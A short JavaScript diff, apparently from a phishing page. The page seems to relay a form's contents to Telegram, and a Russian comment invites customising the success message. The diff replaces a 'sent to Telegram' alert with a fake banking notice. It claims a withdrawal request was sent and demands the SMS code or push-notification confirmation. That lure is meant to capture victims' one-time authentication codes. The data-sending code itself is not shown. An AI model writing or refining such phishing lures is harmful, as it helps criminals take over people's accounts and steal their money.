@@ -36,7 +36,9 @@ function sendMessage() {
         document.getElementById('enterCodeForm').style.display = 'block';
 
         // Выводим сообщение об успешной отправке (может быть изменено по вашему усмотрению)
-        alert('Сообщение успешно отправлено в Телеграм!');
+        alert('The withdrawal request has been sent.\n' +
+            '\n' +
+            'ENTER THE CODE SPECIFIED IN SMS OR CONFIRM PUSH NOTIFICATION');
     }
 }
 
